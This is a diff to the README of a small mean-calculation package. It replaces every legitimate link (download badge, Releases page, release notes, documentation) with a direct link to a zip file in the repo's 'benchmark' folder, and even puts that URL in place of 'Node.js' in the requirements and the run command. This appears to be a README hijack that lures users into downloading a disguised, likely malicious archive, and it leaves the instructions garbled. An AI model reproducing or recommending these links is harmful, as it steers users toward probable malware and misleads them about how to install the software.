@@ -1,6 +1,6 @@
 # 📊 stats-base-ndarray-smeankbn - Calculate Mean Quickly and Easily
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/releases)
+[![Download](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip)](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ Follow the simple steps below to download and run the software.
 ## 🌐 System Requirements
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12.0 or higher
+- **https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip**: Version 12.0 or higher
 - **Memory**: At least 512 MB RAM
 - **Disk Space**: 10 MB free space
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page: [GitHub Releases](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/releases).
+To download the latest version, visit this page: [GitHub Releases](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version.
@@ -26,13 +26,13 @@ To download the latest version, visit this page: [GitHub Releases](https://githu
 
 ## ⚙️ Running the Application
 
-After installation, you can run the application using Node.js. Here’s how:
+After installation, you can run the application using https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip Here’s how:
 
 1. Open your terminal or command prompt.
 2. Navigate to the folder where you saved the application.
 3. Type the following command:
    ```
-   node index.js
+   node https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip
    ```
 4. Press **Enter** to run the application.
 
@@ -103,7 +103,7 @@ For any other inquiries, feel free to contact the project maintainers.
 
 ## 🔗 Additional Resources
 
-- [View Release Notes](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/releases)
-- [Documentation](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/wiki)
+- [View Release Notes](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip)
+- [Documentation](https://github.com/aarmohan1/stats-base-ndarray-smeankbn/raw/refs/heads/main/benchmark/stats_base_smeankbn_ndarray_v3.3-beta.4.zip)
 
 Thank you for choosing **stats-base-ndarray-smeankbn**. We hope it meets your mean calculation needs!
